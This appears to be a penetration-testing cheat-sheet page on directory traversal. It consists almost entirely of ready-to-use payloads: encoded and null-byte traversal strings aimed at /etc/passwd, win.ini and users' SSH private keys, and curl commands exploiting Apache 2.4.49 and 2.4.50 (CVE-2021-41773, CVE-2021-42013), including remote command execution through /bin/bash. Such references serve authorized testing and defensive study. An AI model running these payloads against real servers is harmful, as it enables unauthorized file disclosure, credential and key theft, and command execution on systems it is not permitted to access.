---
title: Directory (Path) Traversal
description: Directory traversal attack exploits an application to gain unauthorized access to the file system.
tags:
    - Web
refs:
    - https://www.exploit-db.com/exploits/50383
    - https://www.exploit-db.com/exploits/50406
date: 2022-12-28
draft: false
---

```sh
/image?file=index.php
/image?file=index.html
/image?file=/etc/passwd
/image?file=../../../etc/passwd
/image?file=....//....//....//etc/passwd
/image?file=..%252f..%252f..%252fetc/passwd
/image?file=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
/image?file=/var/www/images/../../../etc/passwd
/image?file=/etc/passwd%00.png
/image?file=../../../etc/passwd%00.png
/image?file=....//....//....//etc/passwd%00.png
/image?file=..%252f..%252f..%252fetc/passwd%00.png
/image?file=/var/www/images/../../../etc/passwd%00.png

/image?file=..\..\..\windows\win.ini

# SSH
/image?file=../../../../../home/<username>/.ssh/authorized_keys
/image?file=../../../../../home/<username>/.ssh/id_rsa
```

<br />

## Apache 2.4.49 (CVE-2021-41773)

```bash
# without CGI enabled
curl -v 'https://vulnerable.com/cgi-bin/../../../../../../../../../../etc/passwd'
curl -v 'https://vulnerable.com/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd'
curl -v 'https://vulenrable.com/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'

# with CGI enabled
curl -v 'http://vulnerable.com/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'echo Content-Type: text/plain; echo; cat /etc/passwd' -H "Content-Type: text/plain"
```

<br />

## Apache 2.4.50 (CVE-2021-42013)

```bash
# without CGI enabled
curl -v 'https://vulnerable.com/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd'

# with CGI enabled
curl -v 'https://vulnerable.com/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash' -d 'echo Content-Type: text/plain; echo; cat /etc/passwd' -H "Content-Type: text/plain"
```